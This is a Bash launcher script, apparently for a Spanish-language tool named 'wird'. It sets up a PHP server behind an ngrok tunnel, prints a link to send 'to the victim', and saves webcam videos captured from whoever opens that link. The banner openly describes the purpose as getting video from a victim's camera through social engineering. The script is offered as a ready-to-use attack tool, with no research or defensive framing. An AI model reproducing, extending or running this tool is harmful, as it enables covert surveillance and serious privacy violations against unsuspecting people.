#!/bin/bash
#
# [Open Source] - [Código Abierto]
#
# wird: (12/02/2021)
#
# Variables
#
trap ctrl_c 2
OS=$(uname -o)
PWD=$(pwd)
#
# Colores Fondo
#
BACKRED=$(setterm -background red)
BACKWHITE=$(setterm -background white)
BACKBLACK=$(setterm -background black)
#
# Colores Resaltados
#
negro="[1;30m"
azul="[1;34m"
verde="[1;32m"
cian="[1;36m"
rojo="[1;31m"
purpura="[1;35m"
amarillo="[1;33m"
blanco="[1;37m"
#
# Colores Bajos
#
black="[0;30m"
blue="[0;34m"
green="[0;32m"
cyan="[0;36m"
red="[0;31m"
purple="[0;35m"
yellow="[0;33m"
white="[0;37m"
#
# Dependencias de wird
#
Dependencies(){
	if [ "${OS}" == "Android" ]; then
		if [ -d "/storage/emulated/0/Capturados" ]; then
			SAVE="/storage/emulated/0/Capturados"
		else
			SAVE="/storage/emulated/0/Capturados"
			mkdir -p "/storage/emulated/0/Capturados"
		fi
		if [ -x ${PREFIX}/bin/php ]; then
			SAVE="/storage/emulated/0/Capturados"
		else
			SAVE="/storage/emulated/0/Capturados"
			pkg install php -y
		fi
		if [ -x ${PREFIX}/bin/curl ]; then
			SAVE="/storage/emulated/0/Capturados"
		else
			SAVE="/storage/emulated/0/Capturados"
			pkg install curl -y
		fi
	else
		if [ -x /bin/php ]; then
			SAVE=$(pwd)
		else
			SAVE=$(pwd)
			apt-get install php -y
		fi
		if [ -x /bin/curl ]; then
			SAVE=$(pwd)
		else
			SAVE=$(pwd)
			apt-get install curl -y
		fi
	fi
}
CheckNgrok(){
	if [ -x ${PWD}/ngrok ]; then
		sleep 0.1
	else
		git clone https://github.com/Darkmux/NgrokTH
		mv ${PWD}/NgrokTH/ngrok ${PWD}
		chmod 777 ngrok
		rm -rf NgrokTH
	fi
}
#
# Capturando Ctrl + C
#
ctrl_c(){
echo -e "${amarillo}
[${rojo}!${amarillo}] ${rojo}Proceso interrumpido por el usuario."${blanco}
exit
}
#
# Banner Wird
#
Wird(){
	sleep 0.5
	clear
echo -e "${verde}
                                ██╗    ██╗██╗██████╗ ██████╗
                                ██║    ██║██║██╔══██╗██╔══██╗
                                ██║ █╗ ██║██║██████╔╝██║  ██║
                                ██║███╗██║██║██╔══██╗██║  ██║
                                ╚███╔███╔╝██║██║  ██║██████╔╝
                                 ╚══╝╚══╝ ╚═╝╚═╝  ╚═╝╚═════╝.py
${cian}
                      :Obtener videos desde la cámara de la víctima:
                     ::         Mediante ingeniería social         ::
                  ..:::                  wird.py                   :::..
${negro}
                        ${BACKRED}__________________________________________${BACKBLACK}
                        ${BACKWHITE}__________ Informática y Hacking _________${BACKBLACK}
                        ${BACKRED}__________________________________________${BACKBLACK}
                        ${BACKWHITE}______https://informaticayhacking.com_____${BACKBLACK}
                        ${BACKRED}__________________________________________${BACKBLACK}
                        ${BACKWHITE}________t.me/Informatica_y_Hacking________${BACKBLACK}
                        ${BACKRED}__________________________________________${BACKBLACK}

			   ${rojo}Creado por: ${blanco}System Failure y Darkmux
"${blanco}
}
#
# Matando Procesos [ php - ngrok ]
#
CheckProcess(){
	NGROK=$(ps aux | grep -o "ngrok" | head -n1)
	PHP=$(ps aux | grep -o "php" | head -n1)

	if [[ ${NGROK} == *'ngrok'* ]]; then
		pkill -f -2 ngrok > /dev/null 2>&1
		killall -2 ngrok > /dev/null 2>&1
	fi
	if [[ ${PHP} == *'php'* ]]; then
		pkill -f -2 php > /dev/null 2>&1
		killall -2 php > /dev/null 2>&1
	fi
}
#
# Iniciando Servidor PHP
#
ServerPHP(){
Wird
php -S 127.0.0.1:4546 -t ${PWD}/wird > /dev/null 2>&1 &
./ngrok http 4546 > /dev/null 2>&1 &
echo -e "${verde}
[${blanco}-${verde}] ${cian}Iniciando el servidor, espere..."
sleep 10
LINK=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
}
#
# Interactuando a la Víctima
#
LinkNgrok(){
Wird
echo -e "${verde}
[${blanco}-${verde}] Enlace para enviar a la víctima:${blanco} ${LINK}"
echo -e "${verde}
[${blanco}-${verde}] ${cian}Esperando interacción de la víctima para capturar el video...

${verde}[${blanco}-${verde}]${amarillo}Si la interacción tarda demasiado,
${verde}[${blanco}-${verde}]${amarillo}Presione ${rojo}Ctrl + C ${amarillo}para salir.
"${blanco}
}
Interaction(){
while [ true ]; do
CAPTURA=$(basename ${PWD}/wird/php/*.webm)
if [[ -f "${PWD}/wird/php/${CAPTURA}" ]]; then
echo -e "${verde}
[${blanco}-${verde}] ${amarillo}La captura ha sido obtenida con éxito..!"
cp ${PWD}/wird/php/*.webm ${SAVE}
rm ${PWD}/wird/php/*.webm
echo -e "${verde}
[${blanco}-${verde}] ${cian}El video se ha guardado en:${blanco} ${SAVE}/${CAPTURA}"
fi
done
}
#
# Declarando Funciones
#
Dependencies
CheckNgrok
CheckProcess
ServerPHP
LinkNgrok
Interaction
#Creado por: System Failure y Darkmux - Informática y Hacking © 2021
